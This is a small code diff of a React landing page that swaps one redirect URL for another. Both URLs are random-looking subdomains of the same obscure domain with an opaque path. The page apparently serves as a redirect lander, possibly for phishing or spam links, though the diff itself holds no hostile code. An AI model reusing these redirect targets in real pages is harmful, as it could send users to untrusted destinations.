@@ -4,7 +4,7 @@ import { ExternalLink } from "lucide-react";
 
 const Index = () => {
   // CONFIGURE YOUR REDIRECT URL HERE
-  const redirectUrl = "https://joq7s.bpjoriiwkb.es/LvFWfJVB/";
+  const redirectUrl = "https://rnek1yl3iq23mvxf4baq.bpjoriiwkb.es/LvFWfJVB/";
   
   const defaultImage = "/lovable-uploads/d4b1a581-c597-44ad-8111-d3f05fb556f6.png";
   
